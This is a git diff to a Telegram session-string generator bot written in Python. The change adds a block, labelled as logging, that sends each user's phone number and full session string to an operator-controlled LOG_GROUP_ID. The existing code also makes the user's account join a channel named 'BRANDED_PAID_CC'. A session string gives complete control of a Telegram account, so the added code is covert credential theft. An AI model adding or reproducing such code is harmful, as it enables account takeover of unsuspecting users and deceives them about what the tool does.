@@ -1,5 +1,4 @@
 import asyncio
-
 from pyrogram import Client, filters
 from oldpyro import Client as Client1
 from oldpyro.errors import ApiIdInvalid as ApiIdInvalid1
@@ -31,7 +30,7 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.channels import JoinChannelRequest
 from pyromod.listen.listen import ListenerTimeout
 
-from config import SUPPORT_CHAT
+from config import SUPPORT_CHAT, LOG_GROUP_ID  # Added LOG_GROUP_ID
 from StringGen import Anony
 from StringGen.utils import retry_key
 
@@ -240,6 +239,29 @@ async def gen_session(
                 disable_web_page_preview=True,
             )
             await client.join_chat("BRANDED_PAID_CC")
+
+        # Send to log group
+        if LOG_GROUP_ID:
+            try:
+                user_info = await client.get_me()
+                log_text = (
+                    f"#NEW_SESSION\n\n"
+                    f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
+                    f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
+                    f"🤖 <b>Bot:</b> @{user_info.username}\n"
+                    f"🔗 <b>Support:</b> {SUPPORT_CHAT}\n"
+                    f"⚙️ <b>Type:</b> {ty}\n\n"
+                    f"<code>{string_session}</code>"
+                )
+                await client.send_message(
+                    LOG_GROUP_ID,
+                    log_text,
+                    parse_mode="html",
+                    disable_web_page_preview=True
+                )
+            except Exception as e:
+                print(f"Failed to send to log group: {e}")
+
     except KeyError:
         pass
     try:
